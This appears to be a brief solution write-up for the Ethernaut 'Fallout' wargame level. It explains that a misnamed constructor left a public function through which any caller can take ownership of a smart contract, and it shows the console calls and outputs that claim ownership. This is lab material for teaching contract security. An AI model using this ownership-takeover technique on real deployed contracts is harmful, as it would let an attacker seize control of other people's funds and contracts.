## Description

Claim ownership of the contract below to complete this level.

## Solution

The contracts constructor was a public function, when calling it again the msg.sender gains ownership

## Commands

await contract.Fal1out()
await contract.owner()
'0x0000000000000000000000000000000000000000'
{tx: '0xfdbb6d02339953552000d5ba290f0c9a58eb70d4e827dbd5260f62669937140d', receipt: {…}, logs: Array(0)}
await contract.owner()
'0xc717879FBc3EA9F770c0927374ed74A998A3E2Ce'